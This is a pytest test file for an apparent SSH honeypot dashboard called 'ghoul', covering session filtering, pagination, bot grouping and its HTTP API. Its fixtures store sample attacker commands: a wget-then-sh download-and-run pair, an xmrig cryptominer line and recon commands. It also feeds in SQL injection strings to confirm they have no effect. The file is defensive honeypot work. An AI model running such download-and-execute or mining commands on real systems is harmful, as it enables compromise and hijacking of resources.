import json
import threading
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

from ghoul import dashboard
from ghoul.store import Store


@pytest.fixture
def store(tmp_path):
    s = Store(str(tmp_path / "f.db"))
    plan = [
        ("10.0.0.1", ["uname -a", "whoami"]),
        ("10.0.0.2", ["wget http://x/y.sh", "sh y.sh"]),
        ("10.0.0.15", ["./xmrig -o stratum+tcp://pool"]),
        ("192.168.1.9", []),
        ("1_0.0.0.9", ["uname"]),
    ]
    for ip, cmds in plan:
        sid = s.open_session(ip, 4000)
        for c in cmds:
            s.event(sid, "command", {"cmd": c})
    yield s
    s.close()


def ips(rows):
    return [r["src_ip"] for r in rows]


def test_default_is_newest_first_and_has_attack_label(store):
    rows = dashboard.sessions(store)
    assert ips(rows)[0] == "1_0.0.0.9" and len(rows) == 5
    assert {r["src_ip"]: r["attack"] for r in rows}["10.0.0.15"] == "майнер"


def test_pagination_pages_do_not_overlap(store):
    first = dashboard.sessions(store, limit=2, offset=0)
    second = dashboard.sessions(store, limit=2, offset=2)
    third = dashboard.sessions(store, limit=2, offset=4)
    ids = [r["id"] for r in first + second + third]
    assert len(ids) == 5 and len(set(ids)) == 5 and ids == sorted(ids, reverse=True)


def test_limit_is_capped_and_garbage_falls_back(store):
    assert dashboard.clamp("99999", 1, dashboard.MAX_LIMIT, 40) == dashboard.MAX_LIMIT
    assert dashboard.clamp("-5", 0, 10, 0) == 0
    assert dashboard.clamp("abc", 1, 200, 40) == 40
    assert dashboard.clamp(None, 1, 200, 40) == 40
    assert len(dashboard.sessions(store, limit="abc")) == 5
    assert dashboard.sessions(store, offset=999) == []


def test_filter_by_ip_prefix(store):
    assert ips(dashboard.sessions(store, ip="10.0.0.1")) == ["10.0.0.15", "10.0.0.1"]
    assert ips(dashboard.sessions(store, ip="192.")) == ["192.168.1.9"]


def test_ip_filter_treats_like_wildcards_literally(store):
    assert dashboard.sessions(store, ip="%") == []
    assert dashboard.sessions(store, ip="_") == [r for r in dashboard.sessions(store) if r["src_ip"].startswith("_")]
    assert ips(dashboard.sessions(store, ip="1_")) == ["1_0.0.0.9"]


def test_sql_injection_in_filters_is_inert(store):
    assert dashboard.sessions(store, ip="' OR 1=1 --") == []
    assert dashboard.sessions(store, attack="майнер' OR '1'='1") == []
    assert len(dashboard.sessions(store)) == 5


def test_filter_by_attack_type_and_combination(store):
    assert ips(dashboard.sessions(store, attack="майнер")) == ["10.0.0.15"]
    assert ips(dashboard.sessions(store, attack="загрузчик ботнета")) == ["10.0.0.2"]
    assert dashboard.sessions(store, attack="майнер", ip="10.0.0.2") == []
    assert dashboard.sessions(store, attack="нет такого") == []


def test_attacks_summary_unchanged_by_refactor(store):
    counts = dict(map(tuple, dashboard.attacks(store)))
    assert counts["майнер"] == 1 and counts["загрузчик ботнета"] == 1 and counts["разведка системы"] == 2
    assert "вошёл и молчит" not in counts


def test_http_query_parameters(tmp_path):
    db = str(tmp_path / "h.db")
    s = Store(db)
    for i in range(7):
        s.open_session(f"10.1.0.{i}", 1)
    s.close()
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), dashboard.make_handler(db))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"

    def get(path):
        return json.loads(urllib.request.urlopen(base + path).read())

    try:
        assert len(get("/api/sessions?limit=3")) == 3
        assert [r["src_ip"] for r in get("/api/sessions?limit=2&offset=2")] == ["10.1.0.4", "10.1.0.3"]
        assert [r["src_ip"] for r in get("/api/sessions?ip=10.1.0.6")] == ["10.1.0.6"]
        assert len(get("/api/sessions?limit=zzz&offset=-1")) == 7
    finally:
        httpd.shutdown()


def _bot(store, ip, client, cmds, authed=True):
    sid = store.open_session(ip, 1, client)
    if authed:
        store.log_auth(sid, "root", "x", True)
        store.db.execute("UPDATE sessions SET authed = 1 WHERE id = ?", (sid,))
    for c in cmds:
        store.event(sid, "command", {"cmd": c})
    return sid


def test_groups_merge_identical_bots(store):
    for _ in range(3):
        _bot(store, "198.51.100.7", "SSH-2.0-libssh", ["uname -a", "whoami"])
    _bot(store, "198.51.100.7", "SSH-2.0-libssh", ["uname -a"])  # другой набор команд
    _bot(store, "198.51.100.8", "SSH-2.0-libssh", ["uname -a", "whoami"])  # другой IP
    _bot(store, "198.51.100.9", "x", ["id"], authed=False)  # не вошёл, не считаем
    store.db.commit()
    got = dashboard.groups(store)
    assert len(got) == 1 and got[0]["n"] == 3
    assert got[0]["ip"] == "198.51.100.7" and got[0]["cmds"] == ["uname -a", "whoami"]


def test_groups_order_limit_and_min_repeats(store):
    for ip, n in (("203.0.113.1", 2), ("203.0.113.2", 5), ("203.0.113.3", 3)):
        for _ in range(n):
            _bot(store, ip, "c", ["ls"])
    _bot(store, "203.0.113.4", "c", ["ls"])
    store.db.commit()
    got = dashboard.groups(store)
    assert [g["n"] for g in got] == [5, 3, 2]
    assert [g["n"] for g in dashboard.groups(store, limit=1)] == [5]
    assert len(dashboard.groups(store, limit="999")) == 3
    assert len(dashboard.groups(store, min_repeats=1)) == 4


def test_groups_silent_logins_group_together(store):
    for _ in range(2):
        _bot(store, "203.0.113.50", None, [])
    store.db.commit()
    got = dashboard.groups(store)
    assert got[0]["cmds"] == [] and got[0]["n"] == 2


def test_groups_fast_on_many_sessions(tmp_path):
    import time

    s = Store(str(tmp_path / "big.db"))
    rows = [(float(i), f"10.{i % 200}.0.1", "c", "root", "x", 1) for i in range(50000)]
    s.db.executemany(
        "INSERT INTO sessions (started, src_ip, client_version, username, password, authed) VALUES (?,?,?,?,?,?)", rows
    )
    s.db.commit()
    start = time.time()
    got = dashboard.groups(s)
    assert time.time() - start < 5 and got and got[0]["n"] >= 250
    s.close()


def test_groups_endpoint(tmp_path):
    db = str(tmp_path / "g.db")
    s = Store(db)
    for _ in range(2):
        _bot(s, "203.0.113.5", "c", ["id"])
    s.close()
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), dashboard.make_handler(db))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        data = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{httpd.server_address[1]}/api/groups").read())
        assert data[0]["n"] == 2
    finally:
        httpd.shutdown()
